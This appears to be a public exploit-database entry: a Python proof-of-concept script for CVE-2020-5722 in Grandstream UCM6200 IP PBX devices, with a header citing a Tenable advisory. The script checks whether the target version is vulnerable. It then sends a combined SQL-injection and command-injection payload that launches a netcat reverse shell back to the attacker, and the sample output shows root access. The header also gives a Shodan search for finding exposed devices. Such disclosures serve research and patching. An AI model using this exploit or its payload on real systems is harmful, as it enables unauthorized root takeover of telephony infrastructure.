# Exploit Author: Jacob Baines
# Vendor: http://www.grandstream.com
# Product Link: http://www.grandstream.com/products/ip-pbxs/ucm-series-ip-pbxs/product/ucm6200-series
# Tested on: UCM6202 1.0.18.13
# CVE : CVE-2020-5722
# Shodan Dork: ssl:"Grandstream" "Set-Cookie: TRACKID"
# Advisory: https://www.tenable.com/security/research/tra-2020-15
#
# Sample output:
# albinolobster@ubuntu:~$ python3 pbx_sploit.py --rhost 192.168.2.1 --lhost 192.168.2.107
# [+] Sending getInfo request to  https://192.168.2.1:8089/cgi
# [+] Remote target info:
# -> Model:  UCM6202
# -> Version:  1.0.18.13
# [+] Vulnerable version!
# [+] Sending exploit. Reverse shell to 192.168.2.107:1270
#
# albinolobster@ubuntu:~$ nc -lvp 1270
# Listening on [] (family 2, port)
# Connection from _gateway 41675 received!
# whoami
# root
# uname -a
# Linux UCM6202 3.0.35 #1 SMP PREEMPT Thu Jul 5 15:56:51 CST 2018 armv7l GNU/Linux
##

import os
import re
import sys
import json
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

top_parser = argparse.ArgumentParser(description=&#039;&#039;)
top_parser.add_argument(&#039;--rhost&#039;, action="store", dest="rhost",
required=True, help="The remote host to connect to")
top_parser.add_argument(&#039;--rport&#039;, action="store", dest="rport", type=int,
help="The remote port to connect to", default=8089)
top_parser.add_argument(&#039;--lhost&#039;, action="store", dest="lhost",
required=True, help="The local host to connect back to")
top_parser.add_argument(&#039;--lport&#039;, action="store", dest="lport", type=int,
help="The local port to connect back to", default=1270)
args = top_parser.parse_args()


url = &#039;https://&#039; + args.rhost + &#039;:&#039; + str(args.rport) + &#039;/cgi&#039;
print(&#039;[+] Sending getInfo request to &#039;, url)

try:
    resp = requests.post(url=url, data=&#039;action=getInfo&#039;, verify=False)
except Exception:
    print(&#039;[-] Error connecting to remote target&#039;)
    sys.exit(1)

if resp.status_code != 200:
    print(&#039;[-] Did not get a 200 OK on getInfo request&#039;)
    sys.exit(1)

if resp.text.find(&#039;{ "response":&#039;) != 0:
    print(&#039;[-] Unexpected response&#039;)
    sys.exit(1)

try:
    parsed_response = json.loads(resp.text)
except Exception:
    print(&#039;[-] Unable to parse json response&#039;)
    sys.exit(1)

print(&#039;[+] Remote target info: &#039;)
print(&#039;\t-> Model: &#039;, parsed_response[&#039;response&#039;][&#039;model_name&#039;])
print(&#039;\t-> Version: &#039;, parsed_response[&#039;response&#039;][&#039;prog_version&#039;])

match = re.match(&#039;^([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)$&#039;,
parsed_response[&#039;response&#039;][&#039;prog_version&#039;])
if not match:
    print(&#039;[-] Failed to extract the remote targets version&#039;)
    sys.exit(1)

major = int(match[1])
minor = int(match[2])
point = int(match[3])
patch = int(match[4])

if (major > 1) or (major == 1 and minor > 0) or (major == 1 and minor == 0
and point > 19) or (major == 1 and minor == 0 and point == 19 and patch >=
20):
    print(&#039;[-] Unaffected version&#039;)
    sys.exit(1)
else:
    print(&#039;[+] Vulnerable version!&#039;)

print(&#039;[+] Sending exploit. Reverse shell to %s:%i&#039; % (args.lhost,
args.lport))
try:
    exploit = &#039;admin\&#039; or 1=1--`;`nc${IFS}&#039; + args.lhost + &#039;${IFS}&#039; +
str(args.lport) + &#039;${IFS}-e${IFS}/bin/sh`;`&#039;
    resp = requests.post(url=url,
data=&#039;action=sendPasswordEmail&user_name=&#039; + exploit, verify=False)
except Exception as err:
    print(&#039;[-] Failed to send payload&#039;)
    sys.exit(1)

if resp.status_code != 200:
    print(&#039;[-] Did not get a 200 OK on sendPasswordEmail request&#039;)
    sys.exit(1)

try:
    parsed_response = json.loads(resp.text)
except Exception:
    print(&#039;[-] Unable to parse json response&#039;)
    sys.exit(1)

if parsed_response[&#039;status&#039;] == 0:
    print(&#039;[+] Success! Clean exit.&#039;)
else:
    print(&#039;[-] Something bad happened.&#039;)

